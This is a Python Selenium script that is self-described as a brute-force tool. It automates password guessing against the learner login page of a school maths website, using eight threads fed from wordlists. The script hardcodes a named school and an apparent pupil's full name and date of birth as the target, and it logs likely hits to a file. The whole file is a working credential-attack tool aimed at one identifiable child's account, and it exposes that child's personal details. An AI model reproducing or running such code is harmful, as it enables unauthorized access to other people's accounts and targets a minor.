import threading
import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException

possiblepasswords=open("possible.txt","a")

#Graphics
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   CWHITE  = '\33[37m'


#Config#
parser = OptionParser()
now = datetime.datetime.now()

#Args
parser.add_option("-u", "--username", dest="username",help="Choose the username")
parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
parser.add_option("--website", dest="website",help="choose a website")
(options, args) = parser.parse_args()

def reset(Sel_pas):
   for _ in range(23): Sel_pas.send_keys(Keys.BACK_SPACE)
CHROME_DVR_DIR = 'C:\webdrivers\chromedriver.exe'

def wizard():
    website = "https://hegartymaths.com/login/learner"

    school_selector = "body > div.container > div > div > div.pr > input"
    username_selector1 = "body > div.container > div > div > form > div:nth-child(1) > div > input:nth-child(1)"
    username_selector2 = "body > div.container > div > div > form > div:nth-child(1) > div > input:nth-child(2)"
    username_selector3 = "#day"
    username_selector4 = "#month"
    username_selector5="#year"
    username_btn_selector= "body > div > div > div > form > div:nth-child(3) > button"
    password_selector = "body > div.container > div > div > form > input"
    login_btn_selector = "body > div.container > div > div > form > p.text-center > button"
    failed_btn_selector = "body > div.sweet-alert.showSweetAlert.visible > div.sa-button-container > div > button"
    #body > div.sweet-alert.showSweetAlert.visible > div.sa-button-container > div > button

    school="Queensmead School"
    username5="2007"#year 2007
    username4="August"#month August
    username3="30"#day 30
    username2= "Edwards"#last Edwards
    username1 = "Ryan"#first Ryan
    howmanyconcurrent = "howmanyconcurrent.txt"
    concurrent= open(howmanyconcurrent,'r')
    numberofconcurrent=(concurrent.readlines())[0]#cc
    concurrent.close()
    pass_list="a"
    numberofconcurrent=str(numberofconcurrent)
    pass_list="C:/Python27/wordlist"+numberofconcurrent+".txt"# ACTUAL F FILE
    donesofar=0
    brutes(pore,donesofar,howmanyconcurrent,failed_btn_selector,school,website,username5,username4,username3,username2,username1,pass_list,school_selector,username_selector1,username_selector2,username_selector3,username_btn_selector,username_selector4,username_selector5,password_selector,login_btn_selector)

def brutes(pore,donesofar,howmanyconcurrent,failed_btn_selector,school,website,username5,username4,username3,username2,username1,pass_list,school_selector,username_selector1,username_selector2,username_selector3,username_btn_selector,username_selector4,username_selector5,password_selector,login_btn_selector):
    howmanyconcurrent = "howmanyconcurrent.txt"
    concurrent= open(howmanyconcurrent,'r')
    numberofconcurrent=(concurrent.readlines())[0]
    concurrent.close()
    concurrento=open(howmanyconcurrent,'w')
    numberofconcurrent=int(numberofconcurrent)+1#cc
    concurrento.write(str(numberofconcurrent))
    concurrento.close()
    
    #f=open(pore,"r")#cc disregarded
    f=pore
    #driver = webdriver.Chrome(CHROME_DVR_DIR)
    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    print 'disabled popup blocking'
    optionss.add_argument("--disable-extensions")
    print 'disabled extensions'
    count = 1 #count
    browser = webdriver.Chrome(CHROME_DVR_DIR)
    COUNTERRRR=1
    while True:
            browser.get(website)
            t.sleep(1)
            while COUNTERRRR!=0:
              Sel_school = browser.find_element_by_css_selector(school_selector) #Finds Selector
              Sel_school.send_keys(school)
              t.sleep(5)
              Sel_school.send_keys(Keys.RETURN)
              t.sleep(1)
              COUNTERRRR=COUNTERRRR-1


            Sel_user1 = browser.find_element_by_css_selector(username_selector1) #Finds Selector
            Sel_user2 = browser.find_element_by_css_selector(username_selector2) #Finds Selector
            Sel_user3 = browser.find_element_by_css_selector(username_selector3) #Finds Selector
            Sel_user4 = browser.find_element_by_css_selector(username_selector4) #Finds Selector
            Sel_user5 = browser.find_element_by_css_selector(username_selector5) #Finds Selector

            Sel_user1.send_keys(username1)
            Sel_user2.send_keys(username2)
            Sel_user3.send_keys(username3)
            Sel_user4.send_keys(username4)
            Sel_user5.send_keys(username5)
            Sel_user1.send_keys(Keys.RETURN)
            t.sleep(3)
            try:
                for line in f:
                    temp = line 
                    Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                    donesofar=donesofar+1
                    ofc1=threading.Thread(target=reset(Sel_pas))
                    ofc1.start()
                    Sel_pas.send_keys(line)
                    Sel_pas.send_keys(Keys.ENTER)
                    t.sleep(1)#NEEDED
                    bp=0
                    psych=0
                    while bp==0:
                       try:
                          failed = browser.find_element_by_css_selector(failed_btn_selector)
                          failed.send_keys(Keys.RETURN)
                          bp=1
                       except:
                          print "failed element not found\n"
                          bp=0
                    print '------------------------'
                    print ('Tried password: '+line+' for '+username1+' '+username2+'.')
                    donesofar=donesofar+1
            except KeyboardInterrupt:
               possiblepasswords.close()
               exit()
            except selenium.common.exceptions.NoSuchElementException:
                print 'AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU MUST RESTART IT'
                print 'LAST PASS ATTEMPT BELOW OR ABOVE'
                temp=line
                print 'Password has been found: '+temp
                print "ALLAHUAKBAR"*10000
                possiblepasswords.write("The key: |"+str(temp)+"| is possible, at index:"+str(f.index(temp)))
                possiblepasswords.write(" or it could mean that the previous key was successful: "+str(f[(f.index(temp))-1])+" or.."+str(f[(f.index(temp))-2])+"\n")
                possiblepasswords.close()
                exit()

banner ='''
V4.20 
coded by iscoolguy#3341
brute-force tool                      '''
#driver = webdriver.Chrome(CHROME_DVR_DIR)
optionss = webdriver.ChromeOptions()
optionss.add_argument("--disabled-popup-blocking")
optionss.add_argument("--disabled-extensions")
count = 1 #count

t1=threading.Thread(target=wizard)
t2=threading.Thread(target=wizard)
t3=threading.Thread(target=wizard)
t4=threading.Thread(target=wizard)
t5=threading.Thread(target=wizard)
t6=threading.Thread(target=wizard)
t7=threading.Thread(target=wizard)
t8=threading.Thread(target=wizard)
t9=threading.Thread(target=wizard)
t10=threading.Thread(target=wizard)
t11=threading.Thread(target=wizard)
t12=threading.Thread(target=wizard)
t13=threading.Thread(target=wizard)
t14=threading.Thread(target=wizard)
t15=threading.Thread(target=wizard)
t16=threading.Thread(target=wizard)

openagain=open("wordlist3.txt","r")#change wordlist if needed
al=0
alist=[]
for i in openagain:
   pof=""
   al=al+1#al=how many lines
   pgsla=list(str(i))
   for o in range(0,1):pgsla.pop()
   for k in pgsla: pof=pof+k
   alist.append(pof)
skipper=al//8
openagain.close()
p=[]
list1=[]
list2=[]
list3=[]
list4=[]
list5=[]
list6=[]
list7=[]
list8=[]
for i in range(1,(len(alist)//8)):
      list1.append(alist[(8*i)-(8-1)-1])
      list2.append(alist[(8*i)-(8-2)-1])
      list3.append(alist[(8*i)-(8-3)-1])
      list4.append(alist[(8*i)-(8-4)-1])
      list5.append(alist[(8*i)-(8-5)-1])
      list6.append(alist[(8*i)-(8-6)-1])
      list7.append(alist[(8*i)-(8-7)-1])
      list8.append(alist[(8*i)-(8-8)-1])
print len(alist)
print len(list1)
print (banner)
t.sleep(3)
pore=list1
t1.start()
t.sleep(1)
pore=list2
t2.start()
t.sleep(1)
pore=list3
t3.start()
t.sleep(1)
pore=list4
t4.start()
t.sleep(1)
pore=list5
t5.start()
t.sleep(1)
pore=list6
t6.start()
t.sleep(1)
pore=list7
t7.start()
t.sleep(1)
pore=list8
t8.start()

